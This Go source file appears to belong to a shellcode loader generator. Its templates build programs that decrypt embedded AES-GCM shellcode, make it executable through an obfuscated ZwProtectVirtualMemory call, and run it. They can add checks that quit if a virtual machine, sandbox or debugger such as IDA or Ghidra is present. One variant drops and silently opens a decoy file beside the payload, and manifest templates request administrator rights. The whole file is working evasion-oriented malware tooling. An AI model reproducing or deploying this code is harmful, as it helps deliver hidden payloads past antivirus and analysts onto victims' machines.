package templates

import (
	"encoding/base64"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"os"
	"path"
)

func NoFileTemplate(filepath string, key []byte, nonce []byte, raw []byte, protect bool)  {

	var template = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"syscall"
	"unsafe"
	"net"
	"runtime"
	"strings"
	"github.com/klauspost/cpuid"
)

const (
	PAGE_EXECUTE_READ uintptr = 0x20
)

func ContinueRun() bool {
	if checkNic() || checkResource() {
		println("VM detected, exit")
		return false
	}

	if detectDBG() {
		println("Have a good day")
		return false
	}

	return true
}

// Modified from https://github.com/ShellCode33/VM-Detection
var blacklistedMacAddressPrefixes = []string{
	"00:1C:42", // Parallels
	"08:00:27", // VirtualBox
	"00:05:69", // |
	"00:0C:29", // | > VMWare
	"00:1C:14", // |
	"00:50:56", // |
	"00:16:E3", // Xen
}

func checkNic() bool {
	interfaces, err := net.Interfaces()
	if err != nil {
		return false
	}

	for _, iface := range interfaces {
		macAddr := iface.HardwareAddr.String()
		if strings.HasPrefix(iface.Name, "Ethernet") ||
			strings.HasPrefix(iface.Name, "以太网") ||
			strings.HasPrefix(iface.Name, "本地连接") {
			if macAddr != "" {
				for _, prefix := range blacklistedMacAddressPrefixes {
					if strings.HasPrefix(macAddr, prefix) {
						return true
					}
				}
			}
		}
	}

	return false
}

type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

func checkResource() bool {
	if cpuid.CPU.VM() {
		return true
	}

	memStatus := memoryStatusEx{}
	memStatus.dwLength = (uint32)(unsafe.Sizeof(memStatus))

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
	})).Call((uintptr)(unsafe.Pointer(&memStatus))); ret == 0 {
		return false
	}

	if runtime.NumCPU() < 2 || memStatus.ullTotalPhys < 1<<31 {
		return true
	}

	return false
}

var blacklistDBG = []string{
	"IDA",
	"OLLY",
	"WINDBG",
	"GHIDRA",
}

const MAX_PATH = 260

func detectDBG() bool {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}

	pe32 := syscall.ProcessEntry32{}
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(handle, &pe32)

	for err == nil {
		exeFile := strings.ToUpper(syscall.UTF16ToString(pe32.ExeFile[:MAX_PATH]))
		for _, pn := range blacklistDBG {
			if strings.Contains(exeFile, pn) {
				return true
			}
		}
		err = syscall.Process32Next(handle, &pe32)
	}

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't',
	})).Call(); ret != 0 {
		return true
	}

	return false
}


func X(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL(string([]byte{
		'n', 't', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}

func newAead(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return aead, nil
}

func E(plain []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	return aead.Seal(plain[:0], nonce, plain, nil)
}

func D(cipher []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	output, err := aead.Open(cipher[:0], nonce, cipher, nil)
	if err != nil {
		println(err.Error())
		return nil
	}

	return output
}


func main() {
	
	%s
	key, _ := base64.StdEncoding.DecodeString("%s")
	nonce, _ := base64.StdEncoding.DecodeString("%s")
	buf, _ := base64.StdEncoding.DecodeString("%s")
	buf = D(buf, key, nonce)

	X(buf)
}
`
	protect_str := ""
	if protect {
		color.Green("[>] Add detect virtual machine.")
		protect_str = "if !ContinueRun() { return }"
	}
	err := ioutil.WriteFile(
		filepath,
		[]byte(fmt.Sprintf(
			template,
			protect_str,
			base64.StdEncoding.EncodeToString(key),
			base64.StdEncoding.EncodeToString(nonce),
			base64.StdEncoding.EncodeToString(raw)),
		),
		0777,
	)
	if err != nil {
		color.Red("[x] Generate fail! %s", err)
		os.Exit(0)
	}
	color.Green("[>] Generate file => %s .", filepath)
}

func fileToBase64(filename string) string {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		panic(err)
	}
	base64Str := base64.StdEncoding.EncodeToString(data)
	return base64Str
}


func FileTemplate(filepath string, key []byte, nonce []byte, raw []byte, file string, protect bool)  {
	var template = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"syscall"
	"unsafe"
	"net"
	"runtime"
	"strings"
	"os"
	"os/exec"
	"github.com/klauspost/cpuid"
)

const (
	PAGE_EXECUTE_READ uintptr = 0x20
)

func ContinueRun() bool {
	if checkNic() || checkResource() {
		println("VM detected, exit")
		return false
	}

	if detectDBG() {
		println("Have a good day")
		return false
	}

	return true
}

// Modified from https://github.com/ShellCode33/VM-Detection
var blacklistedMacAddressPrefixes = []string{
	"00:1C:42", // Parallels
	"08:00:27", // VirtualBox
	"00:05:69", // |
	"00:0C:29", // | > VMWare
	"00:1C:14", // |
	"00:50:56", // |
	"00:16:E3", // Xen
}

func checkNic() bool {
	interfaces, err := net.Interfaces()
	if err != nil {
		return false
	}

	for _, iface := range interfaces {
		macAddr := iface.HardwareAddr.String()
		if strings.HasPrefix(iface.Name, "Ethernet") ||
			strings.HasPrefix(iface.Name, "以太网") ||
			strings.HasPrefix(iface.Name, "本地连接") {
			if macAddr != "" {
				for _, prefix := range blacklistedMacAddressPrefixes {
					if strings.HasPrefix(macAddr, prefix) {
						return true
					}
				}
			}
		}
	}

	return false
}

type memoryStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

func checkResource() bool {
	if cpuid.CPU.VM() {
		return true
	}

	memStatus := memoryStatusEx{}
	memStatus.dwLength = (uint32)(unsafe.Sizeof(memStatus))

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
	})).Call((uintptr)(unsafe.Pointer(&memStatus))); ret == 0 {
		return false
	}

	if runtime.NumCPU() < 2 || memStatus.ullTotalPhys < 1<<31 {
		return true
	}

	return false
}

var blacklistDBG = []string{
	"IDA",
	"OLLY",
	"WINDBG",
	"GHIDRA",
}

const MAX_PATH = 260

func detectDBG() bool {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return false
	}

	pe32 := syscall.ProcessEntry32{}
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(handle, &pe32)

	for err == nil {
		exeFile := strings.ToUpper(syscall.UTF16ToString(pe32.ExeFile[:MAX_PATH]))
		for _, pn := range blacklistDBG {
			if strings.Contains(exeFile, pn) {
				return true
			}
		}
		err = syscall.Process32Next(handle, &pe32)
	}

	if ret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't',
	})).Call(); ret != 0 {
		return true
	}

	return false
}


func X(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL(string([]byte{
		'n', 't', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}

func newAead(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return aead, nil
}

func E(plain []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	return aead.Seal(plain[:0], nonce, plain, nil)
}

func D(cipher []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	output, err := aead.Open(cipher[:0], nonce, cipher, nil)
	if err != nil {
		println(err.Error())
		return nil
	}

	return output
}

func base64ToFile(data string, filepath string) {
	
	decodeData, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		panic(err)
	}
	f, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE, os.ModePerm)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	f.Write(decodeData)
}



func main() {
	
	filepath := strings.Replace(os.Getenv("temp") +"\\" + "%s" , "\\", "\\\\", -1)
	data := "%s"
	base64ToFile(data, filepath)
	cmd := exec.Command("cmd", "/k", "start",  filepath)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmd.Start()
	%s
	key, _ := base64.StdEncoding.DecodeString("%s")
	nonce, _ := base64.StdEncoding.DecodeString("%s")
	buf, _ := base64.StdEncoding.DecodeString("%s")
	buf = D(buf, key, nonce)

	X(buf)
}
`
	protect_str := ""
	if protect {
		color.Green("[>] Add detect virtual machine.")
		protect_str = "if !ContinueRun() { return }"
	}

	err := ioutil.WriteFile(
		filepath,
		[]byte(fmt.Sprintf(
			template,
			path.Base(file),
			fileToBase64(file),
			protect_str,
			base64.StdEncoding.EncodeToString(key),
			base64.StdEncoding.EncodeToString(nonce),
			base64.StdEncoding.EncodeToString(raw)),
		),
		0777,
	)
	if err != nil {
		color.Red("[x] Generate fail! %s", err)
		os.Exit(0)
	}
}

func UACTemplate(filepath string, )  {
	var template = `
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">

<assemblyIdentity
    version="1.0.0.0"
    processorArchitecture="x86"
    name="controls"
    type="win32"
></assemblyIdentity>

<dependency>
    <dependentAssembly>
        <assemblyIdentity
            type="win32"
            name="Microsoft.Windows.Common-Controls"
            version="6.0.0.0"
            processorArchitecture="*"
            publicKeyToken="6595b64144ccf1df"
            language="*"
        ></assemblyIdentity>
    </dependentAssembly>
</dependency>

<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
<security>
<requestedPrivileges>
<requestedExecutionLevel level="requireAdministrator"/>
</requestedPrivileges>
</security>
</trustInfo>

</assembly>
`
	err := ioutil.WriteFile(
		filepath,
		[]byte(fmt.Sprintf(template)), 0777, )
	if err != nil {
		color.Red("[x] %s", err)
		os.Exit(0)
	}

}

func NoUACTemplate(filepath string, )  {
	var template = `
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
<assemblyIdentity
    version="1.0.0.0"
    processorArchitecture="x86"
    name="controls"
    type="win32"
></assemblyIdentity>
<dependency>
    <dependentAssembly>
        <assemblyIdentity
            type="win32"
            name="Microsoft.Windows.Common-Controls"
            version="6.0.0.0"
            processorArchitecture="*"
            publicKeyToken="6595b64144ccf1df"
            language="*"
        ></assemblyIdentity>
    </dependentAssembly>
</dependency>
</assembly>
`
	err := ioutil.WriteFile(
		filepath,
		[]byte(fmt.Sprintf(template)), 0777, )
	if err != nil {
		color.Red("[x] %s", err)
		os.Exit(0)
	}

}
